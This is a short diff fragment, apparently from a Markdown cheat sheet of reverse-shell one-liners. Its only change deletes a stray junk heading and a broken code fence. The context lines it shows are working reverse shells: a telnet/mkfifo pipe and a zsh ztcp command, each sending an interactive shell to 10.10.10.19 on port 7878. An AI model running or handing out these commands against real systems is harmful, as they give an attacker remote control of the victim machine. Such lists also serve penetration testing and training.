@@ -453,7 +453,3 @@ TF=$(mktemp -u);mkfifo $TF && telnet 10.10.10.19 7878 0<$TF | sh 1>$TF
 ```bash
 zsh -c 'zmodload zsh/net/tcp && ztcp 10.10.10.19 7878 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
 ```
-
-#### 312312      sada  1231
-
-\`\`\`\`
